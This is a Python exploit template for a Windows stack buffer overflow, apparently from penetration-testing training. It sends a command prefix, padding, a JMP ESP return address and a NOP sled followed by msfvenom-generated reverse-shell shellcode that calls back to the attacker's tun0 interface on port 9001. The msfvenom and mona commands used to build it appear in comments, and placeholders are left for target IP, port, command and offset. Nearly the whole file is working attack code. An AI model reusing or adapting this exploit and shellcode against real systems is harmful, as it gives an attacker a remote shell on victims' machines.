#!/usr/bin/env python3

import socket

ip = "<IP>"
port = <PORT>
prefix = "<COMMAND> "
timeout = 5

# $msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9001 EXITFUNC=thread -b "<BADCHARS|\x00\xa9\xcd\xd4>" -f python -v "shellcode"
shellcode =  ""
shellcode += "\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += "\x5e\x81\x76\x0e\x04\xa6\x36\xd9\x83\xee\xfc"
shellcode += "\xe2\xf4\xf8\x4e\xb4\xd9\x04\xa6\x56\x50\xe1"
shellcode += "\x97\xf6\xbd\x8f\xf6\x06\x52\x56\xaa\xbd\x8b"
shellcode += "\x10\x2d\x44\xf1\x0b\x11\x7c\xff\x35\x59\x9a"
shellcode += "\xe5\x65\xda\x34\xf5\x24\x67\xf9\xd4\x05\x61"
shellcode += "\xd4\x2b\x56\xf1\xbd\x8b\x14\x2d\x7c\xe5\x8f"
shellcode += "\xea\x27\xa1\xe7\xee\x37\x08\x55\x2d\x6f\xf9"
shellcode += "\x05\x75\xbd\x90\x1c\x45\x0c\x90\x8f\x92\xbd"
shellcode += "\xd8\xd2\x97\xc9\x75\xc5\x69\x3b\xd8\xc3\x9e"
shellcode += "\xd6\xac\xf2\xa5\x4b\x21\x3f\xdb\x12\xac\xe0"
shellcode += "\xfe\xbd\x81\x20\xa7\xe5\xbf\x8f\xaa\x7d\x52"
shellcode += "\x5c\xba\x37\x0a\x8f\xa2\xbd\xd8\xd4\x2f\x72"
shellcode += "\xfd\x20\xfd\x6d\xb8\x5d\xfc\x67\x26\xe4\xf9"
shellcode += "\x69\x83\x8f\xb4\xdd\x54\x59\xce\x05\xeb\x04"
shellcode += "\xa6\x5e\xae\x77\x94\x69\x8d\x6c\xea\x41\xff"
shellcode += "\x03\x59\xe3\x61\x94\xa7\x36\xd9\x2d\x62\x62"
shellcode += "\x89\x6c\x8f\xb6\xb2\x04\x59\xe3\x89\x54\xf6"
shellcode += "\x66\x99\x54\xe6\x66\xb1\xee\xa9\xe9\x39\xfb"
shellcode += "\x73\xa1\xb3\x01\xce\x3c\xd2\x41\x98\x5e\xdb"
shellcode += "\x04\x85\x1f\x50\xe2\xcc\x26\x8f\x53\xce\xaf"
shellcode += "\x7c\x70\xc7\xc9\x0c\x81\x66\x42\xd5\xfb\xe8"
shellcode += "\x3e\xac\xe8\xce\xc6\x6c\xa6\xf0\xc9\x0c\x6c"
shellcode += "\xc5\x5b\xbd\x04\x2f\xd5\x8e\x53\xf1\x07\x2f"
shellcode += "\x6e\xb4\x6f\x8f\xe6\x5b\x50\x1e\x40\x82\x0a"
shellcode += "\xd8\x05\x2b\x72\xfd\x14\x60\x36\x9d\x50\xf6"
shellcode += "\x60\x8f\x52\xe0\x60\x97\x52\xf0\x65\x8f\x6c"
shellcode += "\xdf\xfa\xe6\x82\x59\xe3\x50\xe4\xe8\x60\x9f"
shellcode += "\xfb\x96\x5e\xd1\x83\xbb\x56\x26\xd1\x1d\xd6"
shellcode += "\xc4\x2e\xac\x5e\x7f\x91\x1b\xab\x26\xd1\x9a"
shellcode += "\x30\xa5\x0e\x26\xcd\x39\x71\xa3\x8d\x9e\x17"
shellcode += "\xd4\x59\xb3\x04\xf5\xc9\x0c"

# !mona jmp -r esp -cpb "\x00\x16\x2f\xf4\xfd" -> follow in dump on logs for jmp : 625011F7
jmp = "\xF7\x11\x50\x62" # adress of JMP ESP in little endian
nops = 24*"\x90"

string = prefix + "A"*<OFFSET> + jmp + nops + shellcode

try:
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(timeout)
    s.connect((ip, port))
    print("Sending pattern...")
    s.send(bytes(string, "latin-1"))
    print("Done")
except:
  print("Could not connect")
  sys.exit(0)
